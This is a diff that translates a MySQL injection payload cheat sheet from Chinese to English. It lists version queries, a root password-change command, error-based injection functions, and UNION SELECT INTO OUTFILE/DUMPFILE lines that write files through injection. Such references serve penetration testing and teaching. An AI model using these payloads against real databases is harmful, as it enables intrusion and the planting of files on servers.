@@ -1,7 +1,7 @@
 MySQL Payload
 ========================================
 
-常见Payload
+Common Payload
 ----------------------------------------
 - Version 
     - ``SELECT @@version``
@@ -45,7 +45,7 @@ MySQL Payload
 - Change Password
     - ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``
 
-报错注入常见函数
+Common functions for error reporting and injection
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - extractvalue
 - updatexml
@@ -57,27 +57,27 @@ MySQL Payload
 - polygon
 - exp
 
-写文件
+write file
 ----------------------------------------
 
-写文件前提
+Prerequisites for writing files
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- root 权限
-- 知晓文件绝对路径
-- 写入的路径存在写入权限
-- secure_file_priv 允许向对应位置写入
+- root authority
+- Know the absolute path of the file
+- The path to be written has write permissions
+- secure_file_priv allows writing to the corresponding location
 - ``select count(file_priv) from mysql.user``
 
-基于 into 写文件
+Write files based on into
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 .. code-block:: sql
 
     union select 1,1,1 into outfile '/tmp/demo.txt'
     union select 1,1,1 into dumpfile '/tmp/demo.txt'
 
-dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏
+The difference between dumpfile and outfile is that outfile will write a new line at the end of the line and escape the newline character. If it is written to a binary file, it is likely to be damaged by this feature.
 
-基于 log 写文件
+Write files based on log
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 .. code-block:: sql
 
